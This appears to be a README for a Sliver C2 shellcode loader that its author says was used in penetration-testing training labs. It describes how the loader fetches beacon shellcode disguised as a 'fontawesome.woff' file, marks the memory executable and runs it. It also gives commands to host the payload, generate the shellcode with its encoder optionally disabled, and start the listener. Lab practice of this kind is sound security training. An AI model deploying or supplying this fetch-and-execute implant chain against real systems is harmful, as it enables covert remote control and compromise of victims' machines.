### Sliver Loader

This Loader was used in Zephyr, Ifrit and Wutai but it also works in other Pro Labs, like Cybernetics.

It only works with default Sliver profile, if you are using a different one you should change Download function.

### Usage

The loader is requesting beacon shellcode from the server doing a request to fontawesome.woff. Once the beacon is stored in shellcode variable it store memory, change the execution permissions and do a callback to call the shellcode.

It is necessary to create a web server to request the beacon, generate the beacon and create the listener.

```bash
python3 -m http.server <port>

generate --http http://ip:port --format shellcode --disable-sgn # Disable sgn is optional
cp implantName fontawesome.woff
http -L <ip> -D -l <port>
```

IP, port and name of the file to request should be specefied in the function Download. It is also recommended create metadata in the loader.
